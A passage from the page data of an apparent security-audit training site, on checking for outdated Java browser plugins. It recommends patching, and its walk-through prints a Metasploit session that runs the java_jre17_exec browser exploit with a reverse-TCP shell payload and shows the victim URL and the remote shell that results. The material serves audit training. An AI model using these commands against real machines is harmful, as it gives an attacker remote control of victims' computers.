These modules allow an attacker to gain complete control over the computer of a victim who visits a malicious Web site hosted anywhere on the Internet. If the attacker is inside the office LAN, they can easily trick the victim into visiting that malicious Web site without the victim even knowing it.</p>\n<p>At least one of the organization’s computers is running an outdated Java browser plugin, and exploit code is widely-available for several critical vulnerabilities in versions older than “Java 7, update 16.” All of the organization’s Java installations should be updated to the latest version. This can be troublesome, as (unlike the Windows operating system itself) Java plugins sometimes require user input before they will install updates.</p>"},"summary":{"html":"<p>Though modern browsers are better at self-updating, and the prevalence of powerful plugins like flash and java are slowly declining, it is valuable to ensure that the browsers in use have updated plugins and are themselves updated.</p>"},"walk_through":{"html":"<section><h6 id=\"outdated-java-browser-plugins\">Outdated Java browser plugins</h6><p>While the threat described below is more severe if carried out by a local attacker (as they can more readily direct the victim to a malicious Web site), it also works remotely. In fact, if a user can be tricked, by a remote attacker, into clicking on a malicious email or Web link, attacks like this represent a significant perimeter threat. By compromising the victim’s machine, they can give the attacker a local point-of-presence without requiring the attacker to crack WPA keys or gain local access in some other way.</p><p>Step 1: Using Metasploit, an attacker can easily create an ad hoc malicious Web site:</p><pre><code>$ msfconsole\n\nIIIIII    dTb.dTb        _.---._\n  II     4'  v  'B   .'\"\".'/|\\`.\"\"'.\n  II     6.     .P  :  .' / | \\ `.  :\n  II     'T;. .;P'  '.'  /  |  \\  `.'\n  II      'T; ;P'    `. /   |   \\ .'\nIIIIII     'YvP'       `-.__|__.-'\n\nI love shells --egypt\n\n\n       =[ metasploit v4.7.0-dev [core:4.7 api:1.0]\n+ -- --=[ 1114 exploits - 627 auxiliary - 178 post\n+ -- --=[ 307 payloads - 30 encoders - 8 nops\n\nmsf > use exploit/multi/browser/java_jre17_exec\n\nmsf exploit(java_jre17_exec) > set PAYLOAD java/shell/reverse_tcp\nPAYLOAD => java/shell/reverse_tcp\n\nmsf exploit(java_jre17_exec) > set LHOST 192.168.1.123\nLHOST => 192.168.1.123\n\nmsf exploit(java_jre17_exec) > set SRVPORT 8081\nSRVPORT => 8081\n\nmsf exploit(java_jre17_exec) > set URIPATH java_test\nURIPATH => java_test\n\nmsf exploit(java_jre17_exec) > run\n[*] Exploit running as background job.\n</code></pre><p>Step 2: At this point, any local user who visits <a href=\"http://192.168.1.123:8081/java_test\">http://192.168.1.123:8081/java_test</a>, and who is running a sufficiently out-of-date version of the Java browser plugin, stands a good chance of giving the attacker full access to his computer:</p><pre><code>[*] Started reverse handler on 192.168.1.123:4444\n\nmsf exploit(java_jre17_exec) >\n\n[*] Using URL: http://0.0.0.0:8081/java_test\n[*] Local IP: http://192.168.1.123:8081/java_test\n[*] Server started.\n\nmsf exploit(java_jre17_exec) >\n\n&#x3C;remote shell>\n</code></pre><p>Figure 1: Attacker in control of the victim’s computer through a remote command shell</p></section>"}}}}}},"pageContext":{"slug":"/activities/check_user_browser_vulns","language":"fr","i18n":{"language":"fr","languages":["en","fr"],"defaultLanguage":"en","generateDefaultLanguagePage":false,"routed":true,"originalPath":"/activities/check_user_browser_vulns","path":"fr/activities/check_user_browser_vulns"}}},"staticQueryHashes":["3649515864","63159454"]}
